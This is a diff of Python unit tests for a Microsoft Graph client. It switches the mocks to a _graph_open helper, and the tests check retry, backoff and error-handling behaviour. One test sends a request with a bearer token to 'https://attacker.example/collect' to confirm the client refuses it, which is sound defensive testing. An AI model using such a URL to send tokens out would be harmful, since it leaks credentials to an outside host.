@@ -89,7 +89,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_get_honors_numeric_retry_after_and_recovers(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen", side_effect=[
+             mock.patch.object(self.m, "_graph_open", side_effect=[
                  _http_error(429, headers={"Retry-After": "3"}),
                  _Response(b'{"value":[]}'),
              ]) as urlopen, \
@@ -105,7 +105,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_absolute_graph_escape_hatch_cannot_exfiltrate_bearer_token(self):
         with mock.patch.object(self.m, "_token", return_value="sensitive-token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen") as urlopen:
+             mock.patch.object(self.m, "_graph_open") as urlopen:
             result = self.m.graph_query("https://attacker.example/collect")
 
         self.assertIn("unsafe Graph path refused", result)
@@ -128,7 +128,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_get_retries_connection_timeout_with_bounded_backoff(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen", side_effect=[
+             mock.patch.object(self.m, "_graph_open", side_effect=[
                  TimeoutError("timed out"),
                  _Response(b'{"id":"ok"}'),
              ]) as urlopen, \
@@ -141,7 +141,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_mutating_post_is_not_replayed_after_transient_response(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen",
+             mock.patch.object(self.m, "_graph_open",
                                side_effect=_http_error(503)) as urlopen, \
              mock.patch.object(self.m.time, "sleep") as sleep:
             result = self.m._graph("POST", "me/sendMail", {"message": {}})
@@ -153,7 +153,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_401_is_system_fault_and_not_retried(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen",
+             mock.patch.object(self.m, "_graph_open",
                                side_effect=_http_error(401)) as urlopen:
             result = self.m._graph("GET", "me")
 
@@ -163,7 +163,7 @@ class GraphContractTests(unittest.TestCase):
     def test_403_explains_both_permission_layers(self):
         error = _http_error(403)
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen",
+             mock.patch.object(self.m, "_graph_open",
                                side_effect=error) as urlopen:
             result = self.m._graph("GET", "me/messages")
 
@@ -175,7 +175,7 @@ class GraphContractTests(unittest.TestCase):
     def test_drive_404_has_truthful_terminal_state(self):
         error = _http_error(404, b'{"error":{"code":"itemNotFound"}}')
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen", side_effect=error):
+             mock.patch.object(self.m, "_graph_open", side_effect=error):
             result = self.m._graph("PUT", "me/drive/root:/report.txt:/content", "hello",
                                    raw_body=True)
 
@@ -183,7 +183,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_conflict_and_malformed_error_bodies_are_returned_without_crashing(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen",
+             mock.patch.object(self.m, "_graph_open",
                                side_effect=_http_error(409, b"not-json")):
             result = self.m._graph("POST", "me/events", {"subject": "test"})
 
@@ -192,7 +192,7 @@ class GraphContractTests(unittest.TestCase):
     def test_locked_docx_upload_retries_four_times_then_reports_unchanged(self):
         errors = [_http_error(423) for _ in range(4)]
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen", side_effect=errors) as urlopen, \
+             mock.patch.object(self.m, "_graph_open", side_effect=errors) as urlopen, \
              mock.patch.object(self.m.time, "sleep") as sleep:
             result = self.m._graph_put_bytes("me/drive/items/item/content", b"docx")
 
@@ -203,7 +203,7 @@ class GraphContractTests(unittest.TestCase):
 
     def test_etag_conflict_is_never_retried(self):
         with mock.patch.object(self.m, "_token", return_value="token"), \
-             mock.patch.object(self.m.urllib.request, "urlopen",
+             mock.patch.object(self.m, "_graph_open",
                                side_effect=_http_error(412)) as urlopen:
             result = self.m._graph_put_bytes(
                 "me/drive/items/item/content", b"docx", if_match='"etag"'
